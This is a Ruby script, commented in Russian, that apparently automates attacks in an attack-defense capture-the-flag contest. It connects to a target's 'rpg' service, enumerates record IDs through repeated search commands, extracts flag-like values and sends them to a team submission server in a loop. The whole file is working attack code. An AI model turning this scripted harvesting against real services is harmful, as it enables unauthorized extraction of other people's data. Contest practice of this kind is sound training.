#!/usr/bin/env ruby
require 'socket'
require 'timeout'
require 'yaml'

#########################################
#
#   сервис: rpg
#    порты: 12345
# алгоритм:
#
#########################################

OUR_HOST = '10.12.21.5'
FLAG_RE  = /^[a-f0-9]{10,32}$/i

# координаты нашей постилки флагов
POST_FLAGS_HOST = "10.12.21.21"
POST_FLAGS_PORT = 12321

#########################################

STDOUT.sync = true

raise "gimme an arg" if ARGV.empty?

@host  = ARGV.first
@ids   = {}
@flags = []

raise "don't attack self!" if @host == OUR_HOST

def read_until_prompt socket
  s = ''
  while true do
    c = socket.getc
    s << c
    return s if s[-3,3] == "\n> "
  end
end

def _gather_flags
  socket = TCPSocket.new @host, 12345
  socket.puts "foo"
  socket.puts "e"
  socket.puts "ne"
  socket.puts "e"
  socket.puts "search"
  5.times{ read_until_prompt socket }
  ids = read_until_prompt(socket)
  while true do
    ids.split("\n").reverse.each do |id|
      id.strip!
      if id =~ /^\d+$/ && @ids[id].nil?
        socket.puts "search #{id}"
        data = read_until_prompt(socket)
        data.gsub! "quick look to the left.....", ''
        data.gsub! "quick look to the right.....", ''
        data.gsub! "Nobody there", ""
        data.gsub! "\n>", ''
        data.strip!
        p data
        @ids[id] = data
        @flags << data if data =~ FLAG_RE
      end
      sleep 0.01
    end
  end
  socket.close
  @flags.uniq!
end

def _submit_flags
  socket = TCPSocket.new POST_FLAGS_HOST, POST_FLAGS_PORT
  socket.puts "id=zork"
  socket.gets
#  @flags.each do |flag|
#    print "[=] #{flag} .. "
#    socket.puts(flag)
#    socket.flush
#    puts socket.gets
#  end
  socket.puts @flags.join("\n")
  socket.flush
  socket.close
  @flags = []
end

def gather_flags
  Timeout.timeout(60){ _gather_flags }
rescue
  puts "[!] #{$!}"
end

def submit_flags
  Timeout.timeout(60){ _submit_flags }
rescue
  puts "[!] #{$!}"
end

def save_cache
  File.open("cache/#@host.yml","w") do |f|
    f << @ids.to_yaml
  end
end

def load_cache
  @ids = YAML::load_file "cache/#@host.yml"
rescue
  p $!
  @ids = {}
end

load_cache

while true do
  gather_flags
  sleep 1
  submit_flags if @flags.any?
  save_cache

  sleep 30
end
